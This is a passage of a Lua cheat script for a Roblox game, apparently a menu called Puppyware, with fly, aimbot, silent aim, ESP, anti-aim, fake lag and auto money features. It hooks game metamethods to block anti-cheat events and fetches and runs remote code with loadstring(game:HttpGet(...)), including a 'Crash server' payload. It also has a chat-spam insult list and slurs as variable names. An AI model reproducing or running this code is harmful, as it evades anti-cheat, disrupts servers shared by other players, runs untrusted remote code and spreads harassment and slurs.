				else
					L_159_.L = -iyflyspeed
				end
			elseif L_165_arg0:lower() == "d" then
				if L_157_arg0 then
					L_159_.R = vehicleflyspeed
				else
					L_159_.R = iyflyspeed
				end
			elseif QEfly and L_165_arg0:lower() == "e" then
				if L_157_arg0 then
					L_159_.Q = vehicleflyspeed * 2
				else
					L_159_.Q = iyflyspeed * 2
				end
			elseif QEfly and L_165_arg0:lower() == "q" then
				if L_157_arg0 then
					L_159_.E = -vehicleflyspeed * 2
				else
					L_159_.E = -iyflyspeed * 2
				end
			end
		end
            )
		IYMouse.KeyUp:connect(
                function(L_166_arg0)
			if L_166_arg0:lower() == "w" then
				L_159_.F = 0
			elseif L_166_arg0:lower() == "s" then
				L_159_.B = 0
			elseif L_166_arg0:lower() == "a" then
				L_159_.L = 0
			elseif L_166_arg0:lower() == "d" then
				L_159_.R = 0
			elseif L_166_arg0:lower() == "e" then
				L_159_.Q = 0
			elseif L_166_arg0:lower() == "q" then
				L_159_.E = 0
			end
		end
            )
		L_162_func()
	end
	function NOFLY()
		FLYING = false
		game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").PlatformStand = true
	end
	function fly()
		NOFLY()
		wait()
		sFLY()
	end

end)

CharacterSector:AddButton('No Jump Cooldown', function()
--auto exc support
if not game.IsLoaded(game) then 
    game.Loaded.Wait(game.Loaded);
end

-- variables 
local IsA = game.IsA;
local newindex = nil 

-- main hook
newindex = hookmetamethod(game, "__newindex", function(self, Index, Value)
    if not checkcaller() and IsA(self, "Humanoid") and Index == "JumpPower" then 
        return
    end
    
    return newindex(self, Index, Value);
end)
end)

CharacterSector:AddButton('Lay Spinbot T', function()
    local L_383_ = false
	local L_384_ = game:GetService("UserInputService");
	L_384_.InputBegan:Connect(function(L_385_arg0, L_386_arg1)
		if (L_385_arg0.KeyCode == Enum.KeyCode.T and L_386_arg1 == false) then
			if L_383_ == false then
				L_383_ = true
				wait()
				getgenv().urspeed = 800
				local L_387_ = game.Players.LocalPlayer.Character
				while wait() do
					L_387_.HumanoidRootPart.CFrame = L_387_.HumanoidRootPart.CFrame * CFrame.Angles(0, math.rad(urspeed), 0)
				end
			else
				L_383_ = false
				getgenv().urspeed = 0
			end
		end
	end);
	game:GetService('RunService').Stepped:connect(function()
		if L_383_ == true then
			local L_388_ = Instance.new("Animation");
			function stopTracks()
				for L_389_forvar0, L_390_forvar1 in next, game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):GetPlayingAnimationTracks(
    
        ) do
					if (L_390_forvar1.Animation.AnimationId:match("rbxassetid")) then
						L_390_forvar1:Stop();
					end;
				end;
			end;
			function loadAnimation(L_391_arg0)
				if L_388_.AnimationId == L_391_arg0 then
					L_388_.AnimationId = "1";
				else
					L_388_.AnimationId = L_391_arg0;
					local L_392_ =
                game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):LoadAnimation(
                L_388_
            );
					L_392_:Play();
				end;
			end;
			loadAnimation("rbxassetid://3152378852");
			wait(1.2)
		end
	end)
	game:GetService('RunService').Stepped:connect(function()
		if L_383_ == false then
			stopTracks();
		end
	end)
end)

CharacterSector:AddToggle('Anti Stomp', false, function(State)
    PuppywareSettings.Blatant.Character.AntiStomp = State
end)

CharacterSector:AddDropdown("Anti Stomp Type", {"Show Body", "Disappear"}, "Disappear", false, function(State)
    PuppywareSettings.Blatant.Character.AntiStompType = State
end)

local AntiAimToggle = BlatantAntiAimSector:AddToggle('Anti Aim ', false, function(State)
    PuppywareSettings.Blatant.BlatantAA.Enabled = State
end)

AntiAimToggle:AddKeybind()

BlatantAntiAimSector:AddToggle('No Auto Rotate', false, function(State)
    PuppywareSettings.Blatant.BlatantAA.NoAutoRotate = State
end)

BlatantAntiAimSector:AddDropdown("Anti Aim Type", {"Jitter", "Spin"}, "Jitter", false, function(Value)
    PuppywareSettings.Blatant.BlatantAA.AntiAimType = Value
end)

BlatantAntiAimSector:AddSlider("Anti Aim Speed", 0, 100, 300, 1, function(Value)
    PuppywareSettings.Blatant.BlatantAA.AntiAimSpeed = Value
end)

BlatantAntiAimSector:AddSlider("Jitter Angle", 0, 180, 360, 1, function(Value)
    PuppywareSettings.Blatant.BlatantAA.JitterAngle = Value
end)

local MiscSector = BlatantTab:CreateSector("Refresh", "left")

MiscSector:AddButton('Refresh', function(State)
    NilBody()
end)

--[[
    MiscSector:AddButton('Unjail', function(State)

    end)
]]

local NilCharBind = MiscSector:AddKeybind("Refresh Bind", false, function()

end, function()
    NilBody()
end)

local CashSector = BlatantTab:CreateSector("Cash", "left")

local AutoDropToggle = CashSector:AddToggle("Auto Drop", false, function(State)
    PuppywareSettings.Blatant.Cash.AutoDrop = State
end)

local xddowo = BlatantTab:CreateSector("ESP", "right")
local L_18_ = loadstring(game:HttpGet("https://raw.githubusercontent.com/epicgamersoocool123/test/main/xduwu1"))()
local nigga1 = xddowo:AddToggle(
    "ESP", false, function(L_201_arg0)
	L_18_:Toggle(L_201_arg0)
end
)
nigga1:AddKeybind()

local nigga2 = xddowo:AddToggle(
    "Tracers", false, function(L_202_arg0)
        L_18_.Tracers = L_202_arg0
    end
    )
nigga2:AddKeybind()

local nigga3 = xddowo:AddToggle("Names", false, function(L_203_arg0)
    L_18_.Names = L_203_arg0
end
)
nigga3:AddKeybind()

local nigga4 = xddowo:AddToggle(
    "Boxes", false, function(L_204_arg0)
        L_18_.Boxes = L_204_arg0
    end
    )
nigga4:AddKeybind()

local tstabxd = BlatantTab:CreateSector("Trash Talk (p)", "right")

tstabxd:AddButton("Enable",function(bool)
local plr = game.Players.LocalPlayer
repeat wait() until plr.Character
local char = plr.Character

local garbage = {
    "ur bad";
    "sonney boy";
    "ez";
    "my grandma has more skill than you";
    "seed";
    "sit son";
    "trash";
    "LOL";
    "LMAO";
    "imagine being you right now";
    "xd";
    "don't try LOL";
    "you lose";
    "why do you even try";
    "I didn't think being this bad was possible";
    "leave";
    "no skill";
    "so sad man.";
    "bad";
    "you're nothing";
    "lol";
    "so trash";
    "so bad";
    "ur salty";
    "salty";
    "look he's mad";
    "cry more";
    "keep crying";
    "cry baby";
    "hahaha I won";
    "no one likes u";
    "run 1s seed";
    "thank you for your time";
    "you were so close!";
    "better luck next time!";
    "rodent";
    "HAHA";
    "ill 5-0";
    "just quit";
    "time to take out the trash";
    "did you get worse?";
    "I'm surprised you haven't quit yet";
    "dog aim";
    "log out son";










}


function TrashTalk(inputObject, gameProcessedEvent)
    if inputObject.KeyCode == Enum.KeyCode.P and gameProcessedEvent == false then        
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
        garbage[math.random(1,#garbage)],
        "All"
    )
    end
end
     
game:GetService("UserInputService").InputBegan:connect(TrashTalk)
end)

local niggaxd = BlatantTab:CreateSector("Crash server", "left")

niggaxd:AddButton('Crash', function(State)
loadstring(game:HttpGet("https://raw.githubusercontent.com/22kristina/dhcrash_gen2/main/crash", true))()
end)

AutoDropToggle:AddSlider(1000, 5000, 10000, 1, function(Value)
    PuppywareSettings.Blatant.Cash.AutoDropAmount = Value
end)

CashSector:AddToggle("Auto Pick Cash", false, function(State)
    PuppywareSettings.Blatant.Cash.AutoPickCash = State
end)

-- Settings Window --

local SettingsTab = Window:CreateTab("Save")

if syn then
    SettingsTab:CreateConfigSystem("left")
else
    Notify({
        Title = "FarzadSexyWare",
        Description = "Your Executor Doesn't Support Config.",
        Duration = 3
    })
end

-- Init --

for _, v in next, Players:GetPlayers() do
    if v ~= LocalPlayer and v:IsFriendsWith(LocalPlayer.UserId) then
        Insert(PuppywareSettings.Aiming.Whitelist.Friends, v.Name)
    end
end

Players.PlayerAdded:Connect(function(_Player)
    if _Player ~= LocalPlayer and _Player:IsFriendsWith(LocalPlayer.UserId) then
        Insert(PuppywareSettings.Aiming.Whitelist.Friends, _Player.Name)
    end
end)

Players.PlayerRemoving:Connect(function(_Player)
    if _Player ~= LocalPlayer and _Player:IsFriendsWith(LocalPlayer.UserId) then
        Remove(PuppywareSettings.Aiming.Whitelist.Friends, _Player.Name)
    end
end)

function NoSpace(Data)
    return Data:gsub("%s+", "") or Data
end
    
function Find(Data)
    local Target = nil
    
    for i, v in next, Players:GetPlayers() do
        if v.Name ~= LocalPlayer.Name and v.Name:lower():match('^'.. NoSpace(Data):lower()) then
            Target = v.Name
        end
    end
    
    return Target
end

function Alive(Player)
    if Player and Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") ~= nil and Player.Character:FindFirstChild("Humanoid") ~= nil and Player.Character:FindFirstChild("Head") ~= nil then
        return true
    end
    return false
end

function Knocked(Player)
    if Alive(Player) then
        if Player.Character.BodyEffects["K.O"].Value then
            return true
        end
        return false
    end
    return false
end

function Grabbing(Player)
    if Alive(Player) then
        if Player.Character:FindFirstChild("GRABBING_CONSTRAINT") then
            return true
        end
        return false
    end
    return false
end

function NearestDistance()
    local Target = nil
    local Distance = math.huge
    
    for i, v in next, Players:GetPlayers() do
        if v ~= LocalPlayer and Alive(LocalPlayer) and Alive(v) then
            local DistanceFromPlayer = (v.Character.HumanoidRootPart.Position - LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
            if Distance > DistanceFromPlayer then
                if (not PuppywareSettings.Aiming.Whitelist.FriendsWhitelist or not table.find(PuppywareSettings.Aiming.Whitelist.Friends, v.Name)) and (not PuppywareSettings.Aiming.Whitelist.CrewEnabled or v:FindFirstChild("DataFolder") and v.DataFolder.Information:FindFirstChild("Crew") and not tonumber(v.DataFolder.Information.Crew.Value) == tonumber(LocalPlayer.DataFolder.Information.Crew.Value)) and (not PuppywareSettings.Aiming.Whitelist.Enabled or not table.find(PuppywareSettings.Aiming.Whitelist.Players, v.Name)) then
                    Target = v
                    Distance = DistanceFromPlayer
                end
            end
        end
    end

    return Target, Distance
end

function NearestMouse()
    local Target = nil
    local Distance = math.huge

    for i, v in next, Players:GetPlayers() do
        if v ~= LocalPlayer and Alive(LocalPlayer) and Alive(v) then
            local RootPosition, RootVisible = CurrentCamera:WorldToViewportPoint(v.Character.HumanoidRootPart.Position)
            local DistanceFromMouse = (Vector2.new(RootPosition.X, RootPosition.Y) - Vector2.new(Mouse.X, Mouse.Y)).Magnitude
            if RootVisible and Distance > DistanceFromMouse then
                if (not PuppywareSettings.Aiming.Whitelist.FriendsWhitelist or not table.find(PuppywareSettings.Aiming.Whitelist.Friends, v.Name)) and (not PuppywareSettings.Aiming.Whitelist.CrewEnabled or v:FindFirstChild("DataFolder") and v.DataFolder.Information:FindFirstChild("Crew") and not tonumber(v.DataFolder.Information.Crew.Value) == tonumber(LocalPlayer.DataFolder.Information.Crew.Value)) and (not PuppywareSettings.Aiming.Whitelist.Enabled or not table.find(PuppywareSettings.Aiming.Whitelist.Players, v.Name)) then
                    Target = v
                    Distance = DistanceFromMouse
                end
            end
        end
    end

    return Target, Distance
end

function NearestType(Type)
    if Type == "Distance" then
        return NearestDistance()
    elseif Type == "Mouse" then
        return NearestMouse()
    end
end

function Jitter(Speed, Angle)
    if Alive(LocalPlayer) then
        local Jit = Speed or math.random(30, 90)
        LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(LocalPlayer.Character.HumanoidRootPart.CFrame.Position) * CFrame.Angles(0, math.rad(Angle) + math.rad((math.random(1, 2) == 1 and Jit or -Jit)), 0) 
    end
end

function TableLowerFind(Table, CurrentName)
    local TableName
    for i, v in pairs(Table) do
        if string.find(CurrentName:gsub("%[", ""):gsub("%]", ""):lower(), v:lower()) then
            TableName = v
        end
    end
    return TableName
end
    
function Spin(Speed)
    if Alive(LocalPlayer) then
        LocalPlayer.Character.HumanoidRootPart.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.Angles(0, math.rad(Speed), 0)
    end
end

function TeleportBuy(Target, AutoSetDelay)
    if workspace.Ignored.Shop:FindFirstChild(Target) and Alive(LocalPlayer) then
        PuppywareModule.Old.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame
        wait(0.05)
        LocalPlayer.Character.HumanoidRootPart.CFrame = Workspace.Ignored.Shop[Target].Head.CFrame * CFrame.new(0, 3, 0)
        wait(0.15)
        if PuppywareSettings.Teleport.AutoPurchase then
            for i = 1, 10 do
                fireclickdetector(Workspace.Ignored.Shop[Target].ClickDetector)
            end
        end
        if PuppywareSettings.Teleport.TeleportReturn then
            wait(PuppywareSettings.Teleport.ReturnDelay)
            LocalPlayer.Character.HumanoidRootPart.CFrame = PuppywareModule.Old.CFrame  
        end
        if AutoSetDelay then
            wait(1)
        end
    end
end

function Buy(Target, Delay, LagBack)
    if workspace.Ignored.Shop:FindFirstChild(Target) and Alive(LocalPlayer) then
        PuppywareModule.Old.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame
        wait(0.05)
        LocalPlayer.Character.HumanoidRootPart.CFrame = Workspace.Ignored.Shop[Target].Head.CFrame * CFrame.new(0, 3, 0)
        wait(0.15)
        for i = 1, 3 do
            fireclickdetector(Workspace.Ignored.Shop[Target].ClickDetector)
        end
        if LagBack then
            wait(1)
            LocalPlayer.Character.HumanoidRootPart.CFrame = PuppywareModule.Old.CFrame  
        end
        if Delay ~= nil then
            wait(Delay)
        end
    end
end

function Visible(OriginPart, Part)
    if Alive(LocalPlayer) then
        local IgnoreList = {CurrentCamera, LocalPlayer.Character, OriginPart.Parent}
        local Parts = CurrentCamera:GetPartsObscuringTarget({OriginPart.Position, Part.Position}, IgnoreList)
    
        for i, v in pairs(Parts) do
            if v.Transparency >= 0.3 then
                PuppywareModule.Instance[#PuppywareModule.Instance + 1] = v
            end
    
            if v.Material == Enum.Material.Glass then
                PuppywareModule.Instance[#PuppywareModule.Instance + 1] = v
            end
        end
    
        return #Parts == 0
    end
    return true
end

function ToolName(Name)
    for Check = 1, 100000 do
        if Workspace.Ignored.Shop:FindFirstChild("[" .. Name .. "] - $" .. Check) then
            return tostring("[" .. Name .. "] - $" .. Check)
        end
    end
end

function ToolAmmo(Name)
    for Check1 = 1, 250 do
        for Check2 = 1, 250 do
            if Workspace.Ignored.Shop:FindFirstChild(Check1 .. " [" .. Name .. " Ammo] - $" .. Check2) then
                return tostring(Check1 .. " [" .. Name .. " Ammo] - $" .. Check2)
            end
        end
    end
end

function NilBody()
    if Alive(LocalPlayer) then
        for i, v in pairs(LocalPlayer.Character:GetChildren()) do
            if v:IsA("BasePart") or v:IsA("Part") or v:IsA("MeshPart") then
                if v.Name ~= "HumanoidRootPart" then
                    v:Destroy()
                end
            end
        end
    end
end

function ChanceTable(Table)
    local Chance = 0
    for i, v in pairs(Table) do
        Chance = Chance + v
    end
    Chance = math.random(0, Chance)
    for i, v in pairs(Table) do
        Chance = Chance - v
        if Chance <= 0 then
            return i
        end
    end	
end

function RandomTable(Table)
    local Values = 0
    for i, v in pairs(Table) do
        Values = i
    end
    
    return Table[math.random(1, Values)]
end

function Remove(Data, Data2)
    for i, v in pairs(Data) do
        if v == Data2 then
            table.remove(Data, i)
        end
    end
end

function IsVisible(GetPosition, IgnoreLists)
    return #CurrentCamera:GetPartsObscuringTarget({game.Players.LocalPlayer.Character.Head.Position, GetPosition}, IgnoreLists) == 0 and true or false
end

function GodFunction(Variable)
    LocalPlayer.Character.RagdollConstraints:Destroy()
    local Folder = Instance.new("Folder", LocalPlayer.Character)
    Folder.Name = "FULLY_LOADED_CHAR"
    wait()
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
    Variable = false
end

function Cham(Data, State)
    local BoxVar = nil
    local GlowVar = nil
    if State then
        for _, v in pairs(Data.Character:GetChildren()) do
            if v:IsA("BasePart") and v.Transparency ~= 1 then
                if not v:FindFirstChild("Box") then
                    BoxVar = Instance.new("BoxHandleAdornment", v)
                    BoxVar.Name = "Box"
                    BoxVar.AlwaysOnTop = true
                    BoxVar.ZIndex = 4
                    BoxVar.Adornee = v
                    BoxVar.Color3 = Color3.fromRGB(0, 153, 153)
                    BoxVar.Transparency = 0.5
                    BoxVar.Size = v.Size + Vector3.new(0.02, 0.02, 0.02)
                end
            end
        end
    else
        for i, v in pairs(Data.Character:GetChildren()) do
            if v:IsA("BasePart") and v.Transparency ~= 1 then
                if v:FindFirstChild("Box") then
                    v["Box"]:Destroy()
                end
            end
        end
        
        return BoxVar, GlowVar
    end
end

UserInputService.InputBegan:Connect(function(Key, Event)
    if Key.UserInputType == Enum.UserInputType.MouseButton2 and not Event then
        PuppywareSettings.Aiming.Aimbot.IsAiming = true
    end
end)

UserInputService.InputEnded:Connect(function(Key, Event)
    if Key.UserInputType == Enum.UserInputType.MouseButton2 and not Event then
        PuppywareSettings.Aiming.Aimbot.IsAiming = false
    end
end)

RunService.Heartbeat:Connect(function()
    if Alive(LocalPlayer) then
        if PuppywareSettings.Blatant.Movement.SpeedEnabled and PuppywareSettings.Blatant.Movement.SpeedType == "CFrame" then
            if PuppywareSettings.Blatant.Movement.SpeedRenderType == "Default" then
                if LocalPlayer.Character.Humanoid.MoveDirection.Magnitude > 0 then
                    for i = 1, PuppywareSettings.Blatant.Movement.SpeedAmount do
                        LocalPlayer.Character:TranslateBy(LocalPlayer.Character.Humanoid.MoveDirection)
                    end
                end
            end
        end
        if PuppywareSettings.Blatant.Character.AntiStomp then
            if Knocked(LocalPlayer) then
                if PuppywareSettings.Blatant.Character.AntiStompType == "Nil Char" then
                    NilBody()
                end
                if PuppywareSettings.Blatant.Character.AntiStompType == "Show Body" then
                    pcall(function()
                        LocalPlayer.Character.Humanoid:Destroy()
                    end)
                end
            end
        end
        if PuppywareSettings.Blatant.Character.AntiBag then
            if LocalPlayer.Character:FindFirstChild("Christmas_Sock") then
                LocalPlayer.Character:FindFirstChild("Christmas_Sock"):Destroy()
            end
        end
        if PuppywareSettings.Blatant.Character.AntiGrab and LocalPlayer.Character:FindFirstChild("GRABBING_CONSTRAINT") then
            LocalPlayer.Character["GRABBING_CONSTRAINT"]:Destroy()
        end
    end
end)

RunService.Stepped:Connect(function()
	if PuppywareSettings.Blatant.BlatantAA.UndergroundWallbang then
		for i, v in pairs(LocalPlayer.Character:GetDescendants()) do
			if v:IsA("BasePart") and v.CanCollide == true then
				v.CanCollide = false
			end
		end
	end
end)

spawn(function()
    while wait() do
        if Alive(LocalPlayer) then
            if PuppywareSettings.Blatant.Character.AutoLettuce then
                pcall(function()
                    Buy("[Lettuce] - $5", 1)
                    if LocalPlayer.Backpack:FindFirstChild("[Lettuce]") then
                        LocalPlayer.Character.Humanoid:EquipTool(LocalPlayer.Backpack["[Lettuce]"])
                    end
                    wait(0.5)
                    LocalPlayer.Character["[Lettuce]"]:Activate()
                end)
            end
            if PuppywareSettings.Blatant.Character.AutoReload then
                local Gun = LocalPlayer.Character:FindFirstChildOfClass("Tool")
                if Gun ~= nil and Gun:FindFirstChild("MaxAmmo") then
                    if Gun.Ammo.Value == 0 then
                        ReplicatedStorage.MainEvent:FireServer("Reload", Gun)
                    end
                end
            end
            if PuppywareSettings.Blatant.Character.AutoArmor then
                if LocalPlayer.Character.BodyEffects.Armor.Value == 0 then
                    Buy("[High-Medium Armor] - $2300", 0.5, true)
                end
            end
        end
    end
end)

RunService.RenderStepped:Connect(function()
    if Alive(LocalPlayer) then
        if PuppywareSettings.Aiming.AimingSettings.PingBasedPrediction then
            local PingStats = GetService.Stats.Network.ServerStatsItem["Data Ping"]:GetValueString()
            local Value = tostring(PingStats)
            local PingValue = Value:split(" ")
            local PingNumber = tonumber(PingValue[1])
    
            if PingNumber < 130 then
                PuppywareSettings.Aiming.AimingSettings.GetVelocity = PingNumber / 1000 + 0.037
            else
                PuppywareSettings.Aiming.AimingSettings.GetVelocity = PingNumber / 1000 + 0.033
            end
        else
            PuppywareSettings.Aiming.AimingSettings.GetVelocity = 0.165
        end
        if PuppywareSettings.Blatant.Cash.AutoDrop then
            ReplicatedStorage.MainEvent:FireServer("DropMoney", tostring(PuppywareSettings.Blatant.Cash.AutoDropAmount))
        end
        if PuppywareSettings.Blatant.Cash.AutoPickCash then
            pcall(function()
                for _, v in pairs(Workspace.Ignored.Drop:GetChildren()) do
                    if v.Name == "MoneyDrop" then
                        local MoneyMagnitude = (v.Position - LocalPlayer.Character.HumanoidRootPart.Position).magnitude
                        if MoneyMagnitude < 25 then
                            fireclickdetector(v.ClickDetector)
                        end 
                    end
                end
            end)
        end
        if PuppywareSettings.Blatant.Farming.ATMPick then
            pcall(function()
                for _, v in pairs(Workspace.Ignored.Drop:GetChildren()) do
                    if v.Name == "MoneyDrop" then
                        local MoneyMagnitude = (v.Position - LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
                        if MoneyMagnitude < 25 then
                            fireclickdetector(v.ClickDetector)
                        end 
                    end
                end
            end)
        end
        if PuppywareSettings.Blatant.Movement.SpeedEnabled and PuppywareSettings.Blatant.Movement.SpeedType == "CFrame" then
            if PuppywareSettings.Blatant.Movement.SpeedRenderType == "Fast" and Alive(LocalPlayer) then
                if LocalPlayer.Character.Humanoid.MoveDirection.Magnitude > 0 then
                    for i = 1, PuppywareSettings.Blatant.Movement.SpeedAmount do
                        LocalPlayer.Character:TranslateBy(LocalPlayer.Character.Humanoid.MoveDirection)
                    end
                end
            end
        end
        if PuppywareSettings.Blatant.LegitAA.Enabled then
            if PuppywareSettings.Blatant.LegitAA.AntiPointAt then
                for i, v in next, Players:GetPlayers() do
                    if v ~= LocalPlayer and Alive(v) and Alive(LocalPlayer) then
                        local BodyEffects = v.Character:FindFirstChild("BodyEffects")
                        local MousePos = BodyEffects:FindFirstChild("MousePos")
                        if BodyEffects ~= nil and MousePos ~= nil then
                            local EnemyMouseMagnitude = (LocalPlayer.Character.HumanoidRootPart.Position - MousePos.Value).Magnitude
                            if PuppywareSettings.Blatant.LegitAA.AntiAimAtDistance > EnemyMouseMagnitude then
                                Root.CFrame = Root.CFrame * CFrame.new(math.random(1, 2) == 1 and 2 or -2, 0, 0)
                            end
                        end
                    end
                end
            end
        end
        if PuppywareSettings.Blatant.BlatantAA.Enabled then
                if PuppywareSettings.Blatant.BlatantAA.AntiAimType == "Jitter" then
                    Jitter(PuppywareSettings.Blatant.BlatantAA.AntiAimSpeed, PuppywareSettings.Blatant.BlatantAA.JitterAngle)
                else
                    Spin(PuppywareSettings.Blatant.BlatantAA.AntiAimSpeed)
                end
                if PuppywareSettings.Blatant.BlatantAA.NoAutoRotate then
                    LocalPlayer.Character.Humanoid.AutoRotate = false
                else
                    LocalPlayer.Character.Humanoid.AutoRotate = true
                end
        else
            LocalPlayer.Character.Humanoid.AutoRotate = true
        end
    end
    if PuppywareSettings.Aiming.RageSection.UnlockTargetKnocked then
        if PuppywareSettings.Aiming.RageSection.Target ~= nil and Players:FindFirstChild(PuppywareSettings.Aiming.RageSection.Target) then
            if Knocked(Players:FindFirstChild(PuppywareSettings.Aiming.RageSection.Target)) then
                PuppywareSettings.Aiming.RageSection.Target = nil
            end
        end
    end
    if PuppywareSettings.Aiming.SilentAim.ShowFOV then
        SilentAimFOV.Visible = true
        SilentAimFOV.Radius = PuppywareSettings.Aiming.FOV.SilentAimSize
        SilentAimFOV.Filled = PuppywareSettings.Aiming.FOV.FOVFilled
        SilentAimFOV.Transparency = PuppywareSettings.Aiming.FOV.Transparency
        SilentAimFOV.NumSides = 100
        SilentAimFOV.Color = PuppywareSettings.Aiming.SilentAim.FOVColor
        SilentAimFOV.Position = Vector2.new(Mouse.X, Mouse.Y + GuiInset.Y)
    else
        SilentAimFOV.Visible = false
    end
    if PuppywareSettings.Aiming.Aimbot.Enabled then
        if PuppywareSettings.Aiming.Aimbot.ShowFOV then
            AimbotFOV.Visible = true
            AimbotFOV.Radius = PuppywareSettings.Aiming.FOV.AimAssistSize
            AimbotFOV.Filled = PuppywareSettings.Aiming.FOV.FOVFilled
            AimbotFOV.Transparency = PuppywareSettings.Aiming.FOV.Transparency
            AimbotFOV.NumSides = 100
            AimbotFOV.Color = PuppywareSettings.Aiming.Aimbot.FOVColor
            AimbotFOV.Position = Vector2.new(Mouse.X, Mouse.Y + GuiInset.Y)
        else
            AimbotFOV.Visible = false
        end
        if PuppywareSettings.Aiming.Aimbot.AimAssist and PuppywareSettings.Aiming.Aimbot.IsAiming then
            local NearestTarget, NearestDistance = NearestType(PuppywareSettings.Aiming.Aimbot.UseNearestDistance and "Distance" or "Mouse")

            if NearestTarget and (not PuppywareSettings.Aiming.Aimbot.GrabbedCheck or not Grabbing(NearestTarget)) and (not PuppywareSettings.Aiming.Aimbot.KnockedOutCheck or not Knocked(NearestTarget)) and (not PuppywareSettings.Aiming.Aimbot.ShowFOV or PuppywareSettings.Aiming.FOV.AimAssistSize > NearestDistance) and (not PuppywareSettings.Aiming.Aimbot.WallCheck or Visible(NearestTarget.Character.HumanoidRootPart, LocalPlayer.Character.HumanoidRootPart)) then
                local TargetPart = (NearestTarget.Character.Humanoid:GetState() == Enum.HumanoidStateType.Freefall and NearestTarget.Character.LeftFoot or NearestTarget.Character[RandomTable(PuppywareSettings.Aiming.Aimbot.Hitboxes)])
                local Prediction = (PuppywareSettings.Aiming.RageSection.MovementPrediction and TargetPart.CFrame + (TargetPart.Velocity * PuppywareSettings.Aiming.RageSection.MovementPredictionAmount) or TargetPart.CFrame + (TargetPart.Velocity * PuppywareSettings.Aiming.AimingSettings.GetVelocity))
                
                if PuppywareSettings.Aiming.AimbotSettings.AimAssistType == "Mouse" then
                    local NearestPosition, NearestVisible = CurrentCamera:WorldToScreenPoint(Prediction.Position)
                    local MouseLocation = CurrentCamera:WorldToScreenPoint(Mouse.Hit.Position)
                    local EndPosition = (PuppywareSettings.Aiming.AimbotSettings.SmoothingTracing and Vector2.new((NearestPosition.X - MouseLocation.X) / PuppywareSettings.Aiming.AimbotSettings.SmoothingTracingAmount, (NearestPosition.Y - MouseLocation.Y) / PuppywareSettings.Aiming.AimbotSettings.SmoothingTracingAmount) or Vector2.new((NearestPosition.X - MouseLocation.X) / 1.4, (NearestPosition.Y - MouseLocation.Y) / 1.4))
                    
                    if NearestVisible then
                        mousemoverel(EndPosition.X, EndPosition.Y)
                    end
                elseif PuppywareSettings.Aiming.AimbotSettings.AimAssistType == "Camera" then
                    CurrentCamera.CFrame = CFrame.lookAt(CurrentCamera.CFrame.Position, Prediction.Position)
                end
            end
        end
    else
        AimbotFOV.Visible = false
    end
end)

spawn(function()
    while wait(1 / 16) do
        LagTick = math.clamp(PuppywareModule.LagTick + 1, 0, PuppywareSettings.Blatant.FakeLag.TriggerAmount)
        if Alive(Player) and PuppywareSettings.Blatant.FakeLag.Enabled then
            if LagTick == math.random(1, PuppywareSettings.Blatant.FakeLag.TriggerAmount) then
                Network:SetOutgoingKBPSLimit(9e9)
                PuppywareFolder:ClearAllChildren()
                LagTick = 0
                --[[
                    if Settings.Visuals.PlayerESP.FakeLag.Cham then
                        for i, v in pairs(Player.Character:GetChildren()) do
                            if v:IsA("BasePart") and v.Name ~= "HumanoidRootPart" then
                                local ShadowPart = Instance.new("Part")
                                ShadowPart.CFrame = v.CFrame
                                ShadowPart.Anchored = true
                                ShadowPart.CanCollide = false
                                ShadowPart.Material = Enum.Material.ForceField
                                ShadowPart.Color = Settings.Visuals.PlayerESP.FakeLag.Color
                                ShadowPart.Name = v.Name
                                ShadowPart.Transparency = 0
                                ShadowPart.Size = v.Size
                                ShadowPart.Parent = FakeLagFolder
                            end
                        end
                    end
                ]]
            else
                if PuppywareSettings.Blatant.FakeLag.Enabled then
                    Network:SetOutgoingKBPSLimit(1)
                end
            end
        else
            PuppywareFolder:ClearAllChildren()
            Network:SetOutgoingKBPSLimit(9e9)
        end
    end
end)

local __namecall -- cock ;)
__namecall = hookmetamethod(game, "__namecall", function(self, ...)
    local Args = {...}
    local Method = getnamecallmethod()

    if tostring(self.Name) == "MainEvent" and tostring(Method) == "FireServer" then
        if Args[1] == "TeleportDetect" or Args[1] == "CHECKER_1" or Args[1] == "OneMoreTime" then
            return
        end
    end

    return __namecall(self, ...)
end)

local __index -- <3
__index = hookmetamethod(game, "__index", function(self, key)
    if self == Mouse and (tostring(key) == "Hit" or tostring(key) == "Target") then
        if PuppywareSettings.Aiming.TargetAim.Enabled then
            if PuppywareSettings.Aiming.TargetAim.Target ~= nil and ChanceTable(PuppywareSettings.Aiming.AimingSettings.HitChanceAmount) == "HitPercent" then
                if Players:FindFirstChild(PuppywareSettings.Aiming.TargetAim.Target) ~= nil and (not PuppywareSettings.Aiming.TargetAim.GrabbedCheck or not Grabbing(Players[PuppywareSettings.Aiming.TargetAim.Target])) and (not PuppywareSettings.Aiming.TargetAim.KnockedOutCheck or not Knocked(Players[PuppywareSettings.Aiming.TargetAim.Target])) and (not PuppywareSettings.Aiming.TargetAim.ShowFOV or PuppywareSettings.Aiming.FOV.TargetAimSize > (LocalPlayer.Character.Head.Position - Players[PuppywareSettings.Aiming.TargetAim.Target].Character.Head.Position).Magnitude) and (not PuppywareSettings.Aiming.TargetAim.WallCheck or Visible(Players[PuppywareSettings.Aiming.TargetAim.Target].Character.HumanoidRootPart, LocalPlayer.Character.HumanoidRootPart)) then
                    local TargetPart = (Players[PuppywareSettings.Aiming.TargetAim.Target].Character.Humanoid:GetState() == Enum.HumanoidStateType.Freefall and Players[PuppywareSettings.Aiming.TargetAim.Target].Character.LeftFoot or Players[PuppywareSettings.Aiming.TargetAim.Target].Character[RandomTable(PuppywareSettings.Aiming.TargetAim.Hitboxes)])
                    local Prediction = (PuppywareSettings.Aiming.RageSection.MovementPrediction and TargetPart.CFrame + (TargetPart.Velocity * PuppywareSettings.Aiming.RageSection.MovementPredictionAmount) or TargetPart.CFrame + (TargetPart.Velocity * PuppywareSettings.Aiming.AimingSettings.GetVelocity))

                    return (tostring(key) == "Hit" and Prediction or tostring(key) == "Target" and TargetPart)
                end
            end
        else    
